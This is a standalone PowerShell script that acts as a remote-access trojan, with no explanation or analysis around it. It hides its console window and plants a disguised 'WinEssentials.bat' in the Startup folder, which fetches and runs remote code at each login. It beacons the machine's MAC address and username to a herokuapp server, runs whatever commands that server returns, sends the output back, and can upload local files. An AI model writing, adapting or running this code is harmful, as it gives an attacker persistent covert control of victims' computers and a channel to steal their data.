Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

function Install {
cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
@echo off
if "%1"=="done" goto runtime
start "" /min %0 done
exit

:runtime
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
"@
}

Install -sting test

$ps = "";
$localMac=Get-WmiObject win32_networkadapterconfiguration | select macaddress
$id = $localMac[1].macaddress
$username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
$wshell = New-Object -ComObject wscript.shell;

function wait {
param([int]$wwee)
Start-Sleep -m $wwee
}

function K {
 param($String)
 $wshell.SendKeys($String)
}

function S {
 param($String)
 k("^t")
 Start-Sleep -m 250
 k($String)
 k("{ENTER}")
}

function U {
param($String)
(New-Object System.Net.WebClient).UploadFile("http://y44v5ltr.herokuapp.com/psfileupload",(Resolve-Path ".\$String"))
}

while (1) 
{
(New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/ping/" + $id + "/" + $username)
$s = (New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/listen/" + $id);

if ([string]::IsNullOrEmpty($s) -eq 0) {

$out = IEX $s;
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($out)
$encoded = [Convert]::ToBase64String($Bytes)
(New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
$ps = $s;

}
}
